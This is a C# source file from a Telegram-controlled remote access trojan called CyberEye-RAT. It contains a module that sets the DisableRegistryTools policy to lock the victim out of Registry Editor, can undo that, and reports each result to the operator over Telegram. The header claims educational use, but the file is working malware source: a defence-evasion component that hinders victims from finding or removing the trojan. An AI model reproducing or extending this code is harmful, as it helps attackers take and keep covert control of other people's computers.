/*
       ^ Author    : Cisamu
       ^ Name      : CyberEye-RAT
       ^ Github    : https://github.com/cisamu123
       > This program is distributed for educational purposes only.
*/

using Microsoft.Win32;
using System;

namespace TelegramRAT.modded
{
    internal sealed class Regedit
    {
        public static void DisableRegedit()
        {
            try
            {
                RegistryKey regKey = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", true);

                if (regKey == null)
                    regKey = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");

                regKey.SetValue("DisableRegistryTools", 1, RegistryValueKind.DWord);
                regKey.Close();

                telegram.sendText("✅Regedit disabled successfully.");
            }
            catch (Exception ex)
            {
                telegram.sendText("❌ Error disabling Regedit: " + ex.Message);
            }
        }

        public static void EnableRegedit()
        {
            try
            {
                RegistryKey regKey = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", true);

                if (regKey != null)
                {
                    regKey.DeleteValue("DisableRegistryTools", false);
                    regKey.Close();
                }

                telegram.sendText("✅ Regedit enabled successfully.");
            }
            catch (Exception ex)
            {
                telegram.sendText("❌ Error enabling Regedit: " + ex.Message);
            }
        }
    }
}
